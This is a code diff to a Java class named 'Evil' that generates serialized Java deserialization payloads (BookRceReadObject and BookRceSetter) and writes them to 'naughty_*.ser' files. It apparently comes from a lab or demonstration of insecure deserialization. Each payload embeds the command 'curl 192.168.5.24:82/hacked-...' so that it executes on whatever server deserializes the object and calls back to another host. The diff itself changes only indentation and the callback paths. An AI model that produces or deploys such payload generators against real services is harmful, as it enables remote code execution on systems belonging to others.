@@ -4,17 +4,17 @@ import java.io.*;
 import java.util.Base64;
 
 public class Evil {
-    public static void main(String[] args) {
+	public static void main(String[] args) {
 		try {
 			createBookRceReadObjectPayload();
 			createBookRceSetterPayload();
 		} catch (Exception e) {
-            System.out.println(e.toString());
-        }
-    }
+			System.out.println(e.toString());
+		}
+	}
 
 	public static void createBookRceReadObjectPayload() throws IOException {
-		BookRceReadObject myBook = new BookRceReadObject("someTitle", "blub", "curl 192.168.5.24:82/hacked");
+		BookRceReadObject myBook = new BookRceReadObject("someTitle", "blub", "curl 192.168.5.24:82/hacked-readObject");
 		String myBookSerialized = serializeBook(myBook);
 
 		FileWriter fileWriter = new FileWriter("naughty_BookRceReadObject.ser");
@@ -24,7 +24,7 @@ public class Evil {
 	}
 
 	public static void createBookRceSetterPayload() throws IOException {
-		BookRceSetter myBook = new BookRceSetter("someTitle", "blub", "curl 192.168.5.24:82/hacked");
+		BookRceSetter myBook = new BookRceSetter("someTitle", "blub", "curl 192.168.5.24:82/hacked-setter");
 		String myBookSerialized = serializeBook(myBook);
 
 		FileWriter fileWriter = new FileWriter("naughty_BookRceSetter.ser");
@@ -33,7 +33,7 @@ public class Evil {
 		printWriter.close();
 	}
 
-    public static String serializeBook(Object myBook) {
+	public static String serializeBook(Object myBook) {
 		ByteArrayOutputStream baos = null;
 
 		try {
